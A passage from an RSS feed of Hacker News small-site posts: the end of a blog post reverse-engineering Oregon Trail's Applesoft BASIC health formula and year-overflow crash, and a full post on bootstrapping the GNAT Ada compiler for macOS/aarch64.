-<p>(This ultimately turned out to be unnecessary. If I had looked more closely at the options for <a href="https://ciderpress2.com/">CiderPress II</a>, I would've seen that you can use the "<a href="https://github.com/fadden/CiderPress2/blob/main/docs/Manual-cp2.md#importip">import</a>" and "<a href="https://github.com/fadden/CiderPress2/blob/main/docs/Manual-cp2.md#exportxp">export</a>" commands to convert Applesoft BASIC files to and from plain text).</p>
-<p>So of <em>course</em> we had to look for the code that calculates the player's health. Here it is, from <tt>OREGON TRAIL</tt>:</p>
-<div><pre><span></span><span>...</span>
-<span>#</span><span> </span><span>3200</span>
-<span>LET</span><span> </span><span>H0</span><span> </span><span>=</span><span> </span><span>C0</span>
-<span>FOR</span><span> </span><span>L</span><span> </span><span>=</span><span> </span><span>C0</span><span> </span><span>TO</span><span> </span><span>C4</span>
-<span>IF</span><span> </span><span>H1</span><span>(</span><span>L</span><span>)</span><span> </span><span>&gt;</span><span> </span><span>C0</span><span> </span><span>THEN</span><span> </span><span>H2</span><span>(</span><span>L</span><span>)</span><span> </span><span>=</span><span> </span><span>H2</span><span>(</span><span>L</span><span>)</span><span> </span><span>-</span><span> </span><span>C1</span>
-<span>LET</span><span> </span><span>H0</span><span> </span><span>=</span><span> </span><span>H0</span><span> </span><span>+</span><span> </span><span>C1</span>
-<span>IF</span><span> </span><span>H2</span><span>(</span><span>L</span><span>)</span><span> </span><span>&lt;</span><span> </span><span>C1</span><span> </span><span>THEN</span><span> </span><span>H1</span><span>(</span><span>L</span><span>)</span><span> </span><span>=</span><span> </span><span>C0</span>
-
-<span>#</span><span> </span><span>3205</span>
-<span>NEXT</span>
-<span>IF</span><span>  </span><span>RND</span><span> </span><span>(</span><span>C1</span><span>)</span><span> </span><span>&lt;</span><span> </span><span>P5</span><span> </span><span>THEN</span><span> </span><span>TM</span><span> </span><span>=</span><span> </span><span>QT</span><span> </span><span>+</span><span>  </span><span>INT</span><span> </span><span>(</span><span> </span><span>RND</span><span> </span><span>(</span><span>C1</span><span>)</span><span> </span><span>*</span><span> </span><span>41</span><span>)</span>
-<span>LET</span><span> </span><span>PP</span><span> </span><span>=</span><span> </span><span>(</span><span> </span><span>RND</span><span> </span><span>(</span><span>C1</span><span>)</span><span> </span><span>&lt;</span><span> </span><span>QP</span><span>)</span>
-<span>LET</span><span> </span><span>W</span><span> </span><span>=</span><span> </span><span>INT</span><span> </span><span>((</span><span>TM</span><span> </span><span>+</span><span> </span><span>10</span><span>)</span><span> </span><span>/</span><span> </span><span>20</span><span>)</span>
-<span>LET</span><span> </span><span>TM</span><span> </span><span>=</span><span> </span><span>W</span>
-
-<span>#</span><span> </span><span>3206</span>
-<span>LET</span><span> </span><span>TR</span><span> </span><span>=</span><span> </span><span>C0</span>
-<span>LET</span><span> </span><span>TS</span><span> </span><span>=</span><span> </span><span>C0</span>
-<span>IF</span><span> </span><span>PP</span><span> </span><span>THEN</span><span> </span><span>Z</span><span> </span><span>=</span><span> </span><span>(</span><span> </span><span>RND</span><span> </span><span>(</span><span>C1</span><span>)</span><span> </span><span>&lt;</span><span> </span><span>.3</span><span>)</span>
-<span>LET</span><span> </span><span>W</span><span> </span><span>=</span><span> </span><span>6</span><span> </span><span>+</span><span> </span><span>Z</span><span> </span><span>+</span><span> </span><span>Z</span>
-<span>LET</span><span> </span><span>TR</span><span> </span><span>=</span><span> </span><span>.2</span><span> </span><span>+</span><span> </span><span>.6</span><span> </span><span>*</span><span> </span><span>Z</span>
-<span>IF</span><span> </span><span>TM</span><span> </span><span>&lt;</span><span> </span><span>C2</span><span> </span><span>THEN</span><span> </span><span>W</span><span> </span><span>=</span><span> </span><span>W</span><span> </span><span>+</span><span> </span><span>C1</span>
-<span>LET</span><span> </span><span>TS</span><span> </span><span>=</span><span> </span><span>8</span><span> </span><span>*</span><span> </span><span>TR</span>
-<span>LET</span><span> </span><span>TR</span><span> </span><span>=</span><span> </span><span>C0</span>
-
-<span>#</span><span> </span><span>3207</span>
-<span>LET</span><span> </span><span>ZT</span><span> </span><span>=</span><span> </span><span>TM</span><span> </span><span>-</span><span> </span><span>C3</span>
-<span>IF</span><span> </span><span>ZT</span><span> </span><span>&lt;</span><span> </span><span>C0</span><span> </span><span>THEN</span><span> </span><span>ZT</span><span> </span><span>=</span><span> </span><span>C2</span><span> </span><span>-</span><span> </span><span>TM</span>
-
-<span>#</span><span> </span><span>3210</span>
-<span>LET</span><span> </span><span>ZC</span><span> </span><span>=</span><span> </span><span>5</span><span> </span><span>-</span><span> </span><span>TM</span><span> </span><span>-</span><span> </span><span>TM</span><span> </span><span>-</span><span> </span><span>OP</span>
-<span>IF</span><span> </span><span>ZC</span><span> </span><span>&lt;</span><span> </span><span>C0</span><span> </span><span>THEN</span><span> </span><span>ZC</span><span> </span><span>=</span><span> </span><span>C0</span>
-
-<span>#</span><span> </span><span>3215</span>
-<span>LET</span><span> </span><span>X</span><span> </span><span>=</span><span> </span><span>(</span><span>ZC</span><span> </span><span>&gt;</span><span> </span><span>P5</span><span>)</span>
-<span>LET</span><span> </span><span>Y</span><span> </span><span>=</span><span> </span><span>(</span><span>PF</span><span> </span><span>=</span><span> </span><span>C0</span><span>)</span>
-<span>LET</span><span> </span><span>ZF</span><span> </span><span>=</span><span> </span><span>F0</span>
-<span>IF</span><span> </span><span>Y</span><span> </span><span>THEN</span><span> </span><span>ZF</span><span> </span><span>=</span><span> </span><span>8</span>
-
-<span>#</span><span> </span><span>3220</span>
-<span>LET</span><span> </span><span>ZP</span><span> </span><span>=</span><span> </span><span>(</span><span>W</span><span> </span><span>&gt;</span><span> </span><span>5</span><span>)</span><span> </span><span>+</span><span> </span><span>(</span><span>W</span><span> </span><span>&gt;</span><span> </span><span>7</span><span>)</span><span> </span><span>+</span><span> </span><span>P</span><span> </span><span>+</span><span> </span><span>P</span>
-
-<span>#</span><span> </span><span>3225</span>
-<span>LET</span><span> </span><span>Z</span><span> </span><span>=</span><span> </span><span>FS</span><span> </span><span>*</span><span> </span><span>P5</span>
-<span>IF</span><span> </span><span>X</span><span> </span><span>OR</span><span> </span><span>Y</span><span> </span><span>THEN</span><span> </span><span>Z</span><span> </span><span>=</span><span> </span><span>FS</span><span> </span><span>+</span><span> </span><span>.8</span>
-
-<span>#</span><span> </span><span>3230</span>
-<span>LET</span><span> </span><span>FS</span><span> </span><span>=</span><span> </span><span>Z</span>
-<span>LET</span><span> </span><span>H</span><span> </span><span>=</span><span> </span><span>.9</span><span> </span><span>*</span><span> </span><span>H</span><span> </span><span>+</span><span> </span><span>ZT</span><span> </span><span>+</span><span> </span><span>ZC</span><span> </span><span>+</span><span> </span><span>ZF</span><span> </span><span>+</span><span> </span><span>ZP</span><span> </span><span>+</span><span> </span><span>FS</span><span> </span><span>+</span><span> </span><span>H0</span><span> </span><span>+</span><span> </span><span>HR</span>
-<span>LET</span><span> </span><span>PF</span><span> </span><span>=</span><span> </span><span>PF</span><span> </span><span>-</span><span> </span><span>FC</span>
-<span>IF</span><span> </span><span>PF</span><span> </span><span>&lt;</span><span> </span><span>C0</span><span> </span><span>THEN</span><span> </span><span>PF</span><span> </span><span>=</span><span> </span><span>C0</span>
-
-<span>#</span><span> </span><span>3235</span>
-<span>IF</span><span>  </span><span>NOT</span><span> </span><span>W1</span><span> </span><span>AND</span><span> </span><span>H</span><span> </span><span>&gt;</span><span> </span><span>139</span><span> </span><span>THEN</span><span>  </span><span>GOSUB</span><span> </span><span>10300</span>
-<span>INVERSE</span>
-<span>...</span>
-</pre></div>
-<p>Constants:</p>
-<ul>
-<li><strong>C0</strong>: 0.0</li>
-<li><strong>C1</strong>: 1.0</li>
-<li><strong>C2</strong>: 2.0</li>
-<li><strong>C3</strong>: 3.0</li>
-<li><strong>C4</strong>: 4.0</li>
-<li><strong>P5</strong>: 0.5</li>
-</ul>
-<p>Inputs:</p>
-<ul>
-<li><strong>NP</strong>: number of party members alive.</li>
-<li><strong>P</strong>: pace. 1: steady, 2: strenuous, 3: gruelling</li>
-<li><strong>PF</strong>: pounds of food left. Copied over from I(8).</li>
-<li><strong>R</strong>: rations. 1: filling, 2: meagre, 3: bare-bones</li>
-<li><strong>W</strong>: weather. 0: very cold, 1: cold, 2: cool, 3: warm, 4: hot, 5: very hot, 6: rainy, 7: snowy, 8: very rainy, 9: very snowy</li>
-</ul>
-<p>Calculated factors:</p>
-<ul>
-<li><strong>FC</strong>: pounds of food consumed. <tt>FC = NP * (4 - R)</tt></li>
-<li><strong>ZC</strong>: clothing misery factor. <tt>ZC = 5 - W * 2 - (clothes/NP)</tt></li>
-<li><strong>ZF</strong>: food misery factor. <tt>ZF = 2 * (R - 1)</tt>, or <tt>= 8</tt> if you have no food left</li>
-<li><strong>ZP</strong>: pace misery factor. <tt>ZP = (W &gt; 5) + (W &gt; 7) + P + P</tt></li>
-<li><strong>ZT</strong>: temperature misery factor. <tt>ZT = 0</tt> if W is warm or cool, otherwise the number of steps away from warm or cool.</li>
-<li><strong>FS</strong>: food starvation factor. <tt>FS = FS + 0.8</tt> if there's no food or if ZC &gt; 0.5, otherwise <tt>FS = FS * 0.5</tt>.</li>
-<li><strong>H0</strong>: seems to be <tt>H0 = 5.0</tt> at calc time?</li>
-<li><strong>HR</strong>: hardship factor. <tt>HR = 10</tt> if the trail is rough, <tt>HR = 20</tt> if someone just died, 20% chance of <tt>HR = 20</tt> if the water is bad, 10% chance of <tt>HR = 10</tt> if there's very little water</li>
-</ul>
-<p>Output:</p>
-<ul>
-<li><strong>H</strong>: party health score. 0-34 is good, 35-69 is fair, 70-104 is poor, 105-139 is very poor. Capped at 139. <tt>H = .9 * H + ZT + ZC + ZF + ZP + FS + H0 + HR</tt></li>
-</ul>
-<p>The inputs were figured out by checking what text the game prints on the screen for those variables; e.g. W is used to fetch a string from an array W$ that looks like this:</p>
-<div><pre><span></span><span>[</span>0xa0ee<span>]</span><span>  </span>5780250001000a<span>  </span>W$<span>[</span><span>10</span><span>]</span><span> </span><span>=</span>
-<span>[</span>0xa0f8<span>]</span><span>  </span>09efa6<span>  </span>-<span> </span>b<span>'very cold'</span>
-<span>[</span>0xa0fb<span>]</span><span>  </span>04eba6<span>  </span>-<span> </span>b<span>'cold'</span>
-<span>[</span>0xa0fe<span>]</span><span>  </span>04e7a6<span>  </span>-<span> </span>b<span>'cool'</span>
-<span>[</span>0xa101<span>]</span><span>  </span>04e3a6<span>  </span>-<span> </span>b<span>'warm'</span>
-<span>[</span>0xa104<span>]</span><span>  </span>03e0a6<span>  </span>-<span> </span>b<span>'hot'</span>
-<span>[</span>0xa107<span>]</span><span>  </span>08d8a6<span>  </span>-<span> </span>b<span>'very hot'</span>
-<span>[</span>0xa10a<span>]</span><span>  </span>05d3a6<span>  </span>-<span> </span>b<span>'rainy'</span>
-<span>[</span>0xa10d<span>]</span><span>  </span>05cea6<span>  </span>-<span> </span>b<span>'snowy'</span>
-<span>[</span>0xa110<span>]</span><span>  </span>0ac4a6<span>  </span>-<span> </span>b<span>'very rainy'</span>
-<span>[</span>0xa113<span>]</span><span>  </span>0abaa6<span>  </span>-<span> </span>b<span>'very snowy'</span>
-</pre></div>
-<p>The health factors are all conjecture based on the inputs, but I think they make sense. We have the formula for H, and there's only one misery factor which would be affected by waiting 14272 years: the food starvation factor. In case you're wondering what that looks like:</p>
-<div><pre><span></span><span>[</span>0x9bb0<span>]</span><span>  </span>4653967e4f4234<span>  </span><span>FS</span><span> </span><span>=</span><span> </span><span>4166608</span>.55078125
-</pre></div>
-<p>Yikes. We can see that every day after crossing Snake River, H would increase by at least 4.1 million, and then be rounded down to the worst possible health score of 139. It would take 15 days of doing nothing but sitting and eating to bring the food starvation factor down to 127, by which point everyone in the party would be dead.</p>
-<p>But finally, FINALLY we know how to distort reality enough to get this train back on the rails. The party is back to full health, all that's left is to get past the final fork at The Dalles and...</p>
-</div>
-<div id="did-we-make-it-to-oregon">
-<h2>Did we make it to Oregon???</h2>
-<p><img alt="A screenshot of an error screen. The text reads &quot;Error 53 at line #50050 in Oregon Trail. Please report this error to MECC.&quot;" src="https://moral.net.au/writing/2025/01/11/waiting_for_oregon/error53.png" title="This only happened because I threw out the receipt"></p><p>Piss. I couldn't find a technical contact for MECC, so I dug around and saw line 50050 was in TRADE.LIB; namely the code responsible for drawing the inventory. Error 53 is the Apple II error code for <tt>GS/OS: parameter out of range</tt>. But what could possibly be wrong with the inventory? It was fine on the road!</p>
-<p>Oh. Wait.</p>
-<div><pre><span></span><span>[</span>0x9d29<span>]</span><span>  </span><span>49802200010009</span><span>  </span>I$<span>[</span><span>9</span><span>]</span><span> </span><span>=</span>
-<span>[</span>0x9d33<span>]</span><span>  </span><span>000000</span><span>  </span>-<span> </span>b<span>''</span>
-<span>[</span>0x9d36<span>]</span><span>  </span>0512a9<span>  </span>-<span> </span>b<span>'Wagon'</span>
-<span>[</span>0x9d39<span>]</span><span>  </span>040ea9<span>  </span>-<span> </span>b<span>'oxen'</span>
-<span>[</span>0x9d3c<span>]</span><span>  </span>10fea8<span>  </span>-<span> </span>b<span>'sets of clothing'</span>
-<span>[</span>0x9d3f<span>]</span><span>  </span>07f7a8<span>  </span>-<span> </span>b<span>'bullets'</span>
-<span>[</span>0x9d42<span>]</span><span>  </span>0ceba8<span>  </span>-<span> </span>b<span>'wagon wheels'</span>
-<span>[</span>0x9d45<span>]</span><span>  </span>0be0a8<span>  </span>-<span> </span>b<span>'wagon axles'</span>
-<span>[</span>0x9d48<span>]</span><span>  </span>0dd3a8<span>  </span>-<span> </span>b<span>'wagon tongues'</span>
-<span>[</span>0x9d4b<span>]</span><span>  </span>0ec5a8<span>  </span>-<span> </span>b<span>'pounds of food'</span>
-<span>[</span>0x9d4b<span>]</span><span>  </span><span>49003400010009</span><span>  </span>I<span>[</span><span>9</span><span>]</span><span> </span><span>=</span>
-<span>[</span>0x9d57<span>]</span><span>  </span>ffffffffff<span>  </span>-<span> </span>-1.7014118342085515e+38
-<span>[</span>0x9d5c<span>]</span><span>  </span>ffffffffff<span>  </span>-<span> </span>-1.7014118342085515e+38
-<span>[</span>0x9d61<span>]</span><span>  </span><span>8310000000</span><span>  </span>-<span> </span><span>4</span>.5
-<span>[</span>0x9d66<span>]</span><span>  </span><span>8528000000</span><span>  </span>-<span> </span><span>21</span>.0
-<span>[</span>0x9d6b<span>]</span><span>  </span>8a09000000<span>  </span>-<span> </span><span>548</span>.0
-<span>[</span>0x9d70<span>]</span><span>  </span><span>8100000000</span><span>  </span>-<span> </span><span>1</span>.0
-<span>[</span>0x9d75<span>]</span><span>  </span><span>8100000000</span><span>  </span>-<span> </span><span>1</span>.0
-<span>[</span>0x9d7a<span>]</span><span>  </span><span>8100000000</span><span>  </span>-<span> </span><span>1</span>.0
-<span>[</span>0x9d7f<span>]</span><span>  </span><span>8200000000</span><span>  </span>-<span> </span><span>2</span>.0
-</pre></div>
-<p>The game was kind enough to gift me -170 billion billion billion billion wagons.</p>
-<p>Actually this was a red herring. Line 50050 is also on Side B inside END.LIB, aka. the screen before the crash (choosing between floating down the Columbia River or taking the Barlow Toll Road).</p>
-<p>And guess what.</p>
-<p>It reads the date:</p>
-<div><pre><span></span><span># 50050</span>
-<span>[</span>0x023d<span>]</span><span>  </span>POKE<span> </span><span>900</span>,NP
-<span>[</span>0x0245<span>]</span><span>  </span>POKE<span> </span><span>901</span>,AY<span> </span>-<span> </span><span>1800</span>
-<span>[</span>0x0252<span>]</span><span>  </span>POKE<span> </span><span>902</span>,AM
-<span>[</span>0x025a<span>]</span><span>  </span>POKE<span> </span><span>903</span>,AD
-</pre></div>
-<p><tt>AY</tt> is the variable containing the year, and the POKE instruction tries to shove the value of <tt>AY - 1800</tt> into <em>a single byte</em> of the regular Apple II memory, causing a crash as it is much larger than the maximum of 255.</p>
-<p>These POKEs seem to be how Oregon Trail saves key information when it switches between BASIC programs. Most of the game is handled by the main program "OREGON TRAIL" (written by John Krenz), which loads in modules like "RIVER.LIB" and keeps access to all the variables. Whenever a new main program is loaded in, all the BASIC variables are lost except for whatever data you happened to copy to regular memory with POKE. At the end of the game you have the option of floating down the river, which uses a new main program "FLOAT" (written by Steven Splinter) before switching again to the "WIN" program, so it follows that the game would need to use the POKEd numbers.</p>
-<p>What happens if we mod the BASIC code in memory to say something else?</p>
-
-<p><img alt="A screenshot of the ending screen of Oregon Trail, showing the beautiful Willamette Valley, and the utterly incorrect year of 18255." src="https://moral.net.au/writing/2025/01/11/waiting_for_oregon/badending.png" title="Oh no."></p><p>Finally we have a definitive answer about whether this whole ordeal is possible. Unlike <em>every other progress screen in the game</em>, the ending screen has the year hardcoded to start with "18", followed by the printed text of whatever <tt>PEEK 901</tt> is. The maximum number of years you can take without crashing the game is 207, and any attempts longer than 51 years will end in the wrong century.</p>
-<p>Really, there wasn't much point going on; it felt like further trickery went against the spirit of the challenge. Maybe there's closure enough in knowing that if you somehow avoid starvation for 142 centuries, the game dicks you at the last possible moment by expecting the year to be sensible.</p>
-</div>
-<div id="then-again-we-re-98-of-the-way-there">
-<h2>Then again we're 98% of the way there</h2>
-<p>I lied. <a href="https://moral.net.au/misc/oregon_sideb_mod.do">Here's</a> a improved version of Oregon Trail side B with the following quality-of-life changes:</p>
-<ul>
-<li>Waiting by a river for conditions to improve resets the food starvation factor to 0.</li>
-<li>The final sequence uses two bytes to store the year.</li>
-</ul>
-<p>Many thanks to the CiderPress II team for making it easy to load replacement code onto the floppy.</p>
-</div>
-<div id="conclusions">
-<h2>Conclusions</h2>
-<p><img alt="A screenshot of the ending screen of Oregon Trail, showing the beautiful Willamette Valley, and the correct end year of 16120." src="https://moral.net.au/writing/2025/01/11/waiting_for_oregon/success.png" title="Nature has reclaimed post-civilisation Oregon"></p><p>Applesoft BASIC is majestically slow, but thanks to 40-bit floating point and standard commands for drawing and text manipulation, Oregon Trail works much better than I could have expected after running the simulation for 14272 years. The final screen being broken is a bit of a letdown, but understandable given how unlikely it is that you'd take 14272 years to finish the game.</p>
-<p>Honestly, one of my aims has been to create a reverse engineering approach that will work for any system, regardless of knowledge or experience, and give you the basic steps for how to understand and modify it. This was a bit of a test run of this, and I think it could be considered a success. Eventually I'll write it down properly, but hopefully this effort will give you some ideas for your next reversing project.</p>
-<p>And albrot? Well, he was able to fulfill his dream and become the <a href="https://www.twitch.tv/albrot/clip/MushyFlirtyPorcupineOhMyDog-r1PPasYUcpDPTW4e">first person to survive for 15000 years on the Oregon Trail</a>. A well deserved victory.</p>
-<p>If you're interested in the tools I wrote for this work, the Applesoft BASIC decompiler and variable scraper I wrote are available <a href="https://github.com/moralrecordings/applesoft-basic-decompiler">here</a>. Happy trails!</p>
-</div>
-
-</div>
-</div>
-</div></div>]]>
-            </description>
-            <link>https://moral.net.au/writing/2025/01/11/waiting_for_oregon/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42682813</guid>
-            <pubDate>Mon, 13 Jan 2025 12:42:27 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Porting the GNAT Ada compiler to macOS/aarch64]]>
-            </title>
-            <description>
-<![CDATA[
-Score 65 | Comments 2 (<a href="https://news.ycombinator.com/item?id=42681917">thread link</a>) | @ingve
-<br/>
-January 13, 2025 | https://briancallahan.net/blog/20250112.html | <a href="https://web.archive.org/web/*/https://briancallahan.net/blog/20250112.html">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
-	<a name="top"></a>
-	<div id="main">
-	    
-	    <p>academic, developer, with an eye towards a brighter techno-social life</p>
-	    <hr>
-		
-	    <hr>
-	</div>
-<h5 id="prev"><a href="https://briancallahan.net/blog/20241216.html">[prev]</a></h5>
-<h5 id="next">[next]</h5>
-    
-<p>After getting a <a href="https://briancallahan.net/blog/20241212.html" target="_blank">port</a> of <a href="https://wiki.dlang.org/GDC" target="_blank">GDC</a> working on my new MacBook Pro, there are still two languages left in the <a href="https://gcc.gnu.org/" target="_blank">GCC</a> suite that I don't have: <a href="https://en.wikipedia.org/wiki/Ada_(programming_language)" target="_blank">Ada</a> and <a href="https://en.wikipedia.org/wiki/Go_(programming_language)" target="_blank">Go</a>. Some <a href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=46986#c48" target="_blank">searching</a> <a href="https://github.com/golang/go/issues/463#issuecomment-66049850" target="_blank">around</a> makes it seem pretty clear that Gccgo is not yet really on the table to macOS. But there should not be any reason we can't add Ada to our GCC suite, seeing as there is already <a href="https://gcc.gnu.org/git/?p=gcc.git;a=blob;f=gcc/ada/libgnat/system-darwin-arm.ads;h=f4a14279a51e34fd7e934a41025e52106427ccc0;hb=HEAD" target="_blank">support for macos/aarch64</a> in the repository. I wanted to get a macOS/aarch64 native Ada through the GNAT compiler in GCC.</p>
-<p>But try as I might, I could not find any precompiled packages for it. I guess part of the issue is that macOS/aarch64 support is not fully upstreamed into GCC propre; instead, Iain Sandoe has a <a href="https://github.com/iains/gcc-darwin-arm64" target="_blank">GitHub repository</a> that includes the necessary changes for full support. I used his <a href="https://github.com/iains/gcc-14-branch" target="_blank">gcc-14-branch</a> repository to build GDC.</p>
-<p>So let's get to work.</p>
-<h4>Virtualizing macOS</h4>
-<p>I don't have <a href="https://en.wikipedia.org/wiki/Rosetta_(software)" target="_blank">Rosetta</a> on my machine. I know it takes all of two seconds to install it, but I also wanted an excuse to play around with Apple's virtualization framework. After some googling around, I settled on using <a href="https://github.com/insidegui/VirtualBuddy" target="_blank">VirtualBuddy</a> as my virtualization manager. It made installing a virtualized copy of Sequoia 15.2 incredibly easy; just say you want to install from the Internet, choose the version you want to install, and away you go. I gave my virtualized machine 4 CPUs and 16 GB of RAM and a 128 GB hard disk, and it felt just as snappy as the host (the host is a MacBook Pro M4 Max with 64 GB of RAM). I installed the command line tools, Rosetta, and some <a href="https://brew.sh/" target="_blank">Homebrew</a> packages on this virtualized machine and I was ready to go.</p>
-<h4>Step 1: Finding a binary of GNAT</h4>
-<p>So why did I install Rosetta? My suspicion was that someone had a binary package of GNAT for macOS/x86_64. But I looked in the usual places: Homebrew, <a href="https://pkgsrc.org/" target="_blank">pkgsrc</a>, <a href="https://www.macports.org/" target="_blank">MacPorts</a>, and <a href="https://www.finkproject.org/" target="_blank">Fink</a>, and none of them had a package. I was beginning to wonder if our project was going to end before it began. Because GNAT is written in Ada, you need an Ada compiler to compile it.</p>
-<p>I eventually stumbled upon <a href="https://alire.ada.dev/" target="_blank">Alire</a> which bills itself as Ada's version of Rust's cargo or OCaml's opam. The Alire homepage directly states that they have a recent Ada package for macOS/x86_64. This was our way in. I followed the <a href="https://alire.ada.dev/docs/#first-steps" target="_blank">tutorial</a> to get the <code>alr</code> binary installed on the virtual machine and got a copy of the GNAT compiler, which happened to be version 14.2.0. That's great, because that's the same version we built with our GDC compiler, and what we will be building from the gcc-14-branch repository.</p>
-<p>The compiler was built for a <code>x86_64-apple-darwin21.6.0</code> target. We will use this to get to a <code>aarch64-apple-darwin24.2.0</code> target.</p>
-<h4>Step 2: Building a Stage 1 GNAT cross compiler</h4>
-<p>I added this Alire-provided GNAT to my <code>PATH</code> and set up the gcc-14-branch repository to prepare to build. Make sure it goes at the front of your <code>PATH</code> so that clang doesn't get picked up instead. I did run the <code>contrib/download_prerequisites</code> script so that GMP, MPFR, MPC, and ISL would be built statically into GCC; that way I don't have to deal with any shared libraries and they're not that big so it won't take long to build them.</p>
-<p>This first pass we need to build a compiler that is built (effectively) from macOS/x86_64, will run on (effectively) macOS/x86_64, but produces code that runs on macOS/aarch64. We also need to remember that all the build tools understand both x86_64 and aarch64; that will be a big help for us. To start, we can run a <code>configure</code> invocation that looks like this:</p>
-<pre>env OTOOL=otool AS=as AR=ar RANLIB=ranlib LIPO=lipo NM=nm DSYMUTIL=dsymutil ../gcc-14-branch-gcc-14.2-darwin-r2/configure --prefix=/opt/gcc14 --enable-languages=ada,c,c++ --with-sysroot=/Library/Developer/CommandLineTools/SDKs/MacOSX15.sdk --build=x86_64-apple-darwin21.6.0 --host=x86_64-apple-darwin21.6.0 --target=aarch64-apple-darwin24.2.0 --disable-nls --with-ld=/usr/bin/ld --with-as=/usr/bin/as
-</pre>
-<p>Then we can run our build with:</p>
-<pre>gmake V=1 -j4
-</pre>
-<p>I installed <a href="https://www.gnu.org/software/make/" target="_blank">GNU make</a> from Homebrew since that is much newer than what I got from the command line tools.</p>
-<p>For now, I am only going to worry about getting GNAT up and running; once we have it then I can worry about combining GNAT and GDC together into one suite.</p>
-<p>I did encounter a few build failures but these all seemed to revolve around autotools wanting prefixed versions of the tools; I would just edit <code>Makefile</code>s and re-run <code>gmake</code> when that happened. Eventually it did succeed and so I installed it into a fake directory, tarred it up, and then installed it on the virtual machine.</p>
-<h4>Step 3: Building a Stage 2 GNAT native compiler</h4>
-<p>Now we can use this new compiler to build another new compiler. This new compiler will be built with the compiler we just built: because the compiler we just built produces code for <code>aarch64-apple-darwin24.2.0</code>, even though it runs on <code>x86_64-apple-darwin21.6.0</code>, once it is finished compiling GCC, <span>that</span> GCC will be a native macOS/aarch64 compiler.</p>
-<p>We'll need to reset our <code>PATH</code> to get rid of the Alire-provided compiler. We don't need it any more. We do need to add the compiler we just built to our <code>PATH</code> as that will be used to create our native compiler.</p>
-<p>Let's create a new build directory and run our <code>configure</code> invocation as follows:</p>
-<pre>env OTOOL=otool AS=as AR=ar RANLIB=ranlib LIPO=lipo NM=nm DSYMUTIL=dsymutil ../gcc-14-branch-gcc-14.2-darwin-r2/configure --prefix=/opt/gcc14 --enable-languages=ada,c,c++ --with-sysroot=/Library/Developer/CommandLineTools/SDKs/MacOSX15.sdk --build=x86_64-apple-darwin21.6.0 --host=aarch64-apple-darwin24.2.0 --target=aarch64-apple-darwin24.2.0 --disable-nls --with-ld=/usr/bin/ld --with-as=/usr/bin/as
-</pre>
-<p>So what we are saying here is that our build machine is (effectively) macOS/x86_64 but we would like to build a compiler that runs on macOS/aarch64 <span>and</span> produces code for macOS/aarch64. A compiler that produces code for the platform it runs on is a native compiler.</p>
-<p>This failed very quickly. Turns out the stage 1 <code>collect2</code> binary was miscompiled and segfaults when it is used. What I did to overcome this was copy the native <code>collect2</code> binary from my GDC compiler to the GNAT compiler. Everything was happy after that.</p>
-<p>Now, we can compile with:</p>
-<pre>gmake V=1 -j4
-</pre>
-<p>Like with the stage 1 compiler, there are some intermittent build failures. But none of these are catastrophic; it is a matter of just editing the <code>Makefile</code>s in question and re-running <code>gmake</code>. The most difficult error was that when linking <code>libstdc++.dylib</code>, there was a linker error that you were linking the library with a library of the same name. The problem is that the infrastructure incorrectly wanted to link with <code>g++</code> instead of <code>gcc</code>. There is a comment in the right place in the <code>Makefile</code> so it's relatively clear that you just need to replace <code>g++</code> with <code>gcc</code> and it will work. I've never had that problem before so perhaps it is something with cross compiling.</p>
-<p>Eventually it will complete successfully, and then same thing: I installed to a fake directory, removed the stage 1 compiler, then tarred and installed the stage 2 compiler.</p>
-<h4>Step 4: Putting it all together</h4>
-<p>Now that I have a native GNAT for macOS/aarch64, I want one single GCC package that will have all the languages that are available: Ada, C, C++, <a href="https://dlang.org/" target="_blank">D</a>, Fortran, <a href="https://en.wikipedia.org/wiki/Modula-2" target="_blank">Modula-2</a>, Objective-C, and Objective-C++. I moved the tarball of the stage 2 GNAT compiler to my host machine, shutdown the virtual machine, and installed the stage 2 compiler. I then put the stage 2 compiler in front of the GDC compiler in my <code>PATH</code> and built the gcc-14-branch compiler one last time:</p>
-<pre>../gcc-14-branch-gcc-14.2-darwin-r2/configure --prefix=/opt/gcc14 --enable-languages=ada,c,c++,d,fortran,m2,objc,obj-c++ --with-sysroot=/Library/Developer/CommandLineTools/SDKs/MacOSX15.sdk
-</pre>
-<p>That's all we need now. All of build, host, and target are <code>aarch64-apple-darwin24.2.0</code>, a fully native compiler. And GCC will detect that automatically and create a new native compiler.</p>
-<p>One last time to build GCC, but let's go a little faster now that we have more CPU cores:</p>
-<pre>gmake V=1 -j10
-</pre>
-<p>This built without any problems. Then for one last time, install to a fake directory, tar it up, remove the old stage 2 compiler and old GDC compiler, and install this new complete GCC suite.</p>
-<h4>Conclusion</h4>
-<p>I've uploaded the tarball <a href="https://github.com/ibara/aarch64-apple-darwin24.2.0-gcc-14.2.0/releases/tag/20250112" target="_blank">here</a> for those that want it. You will need to have the command line tools installed. If someone knows how to get GCC to autoselect between Xcode and the command line tools, please let me know. You'll also need to put <code>/opt/gcc14/bin</code> at the front of your <code>PATH</code> to use it.</p>
-<p>Even better, now no one will ever have to go through the hassle of bringing up Ada support on macOS/aarch64 again. We now have a compiler that can be used as a bootstrap for future releases of GCC. Maybe we'll even have some package managers provide GNAT compilers since the hard work has been done.</p>
-<p><a href="#top"><img alt="Top" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAICAYAAADJEc7MAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4wkWDyUKJxzXegAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAUklEQVQY02Ocd/j/fwY0kGjDwMhACPz//5/h////DPMO//8PYxODWXAZOP8Iw39k22F8uBg2G7Gx0cWYGMgEWJ2aaMPAiO5UDOcTGxjogUe2UwHwdJDZUucW5QAAAABJRU5ErkJggg=="></a></p>
-<a href="https://briancallahan.net/blog/feed.xml"><img alt="RSS" src="https://briancallahan.net/blog/media/pic_rss.gif"></a>
-	<br>
-	<hr>
-	
-    
-
-</div>]]>
-            </description>
-            <link>https://briancallahan.net/blog/20250112.html</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42681917</guid>
-            <pubDate>Mon, 13 Jan 2025 10:14:06 GMT</pubDate>
-        </item>
-        <item>
-            <title>
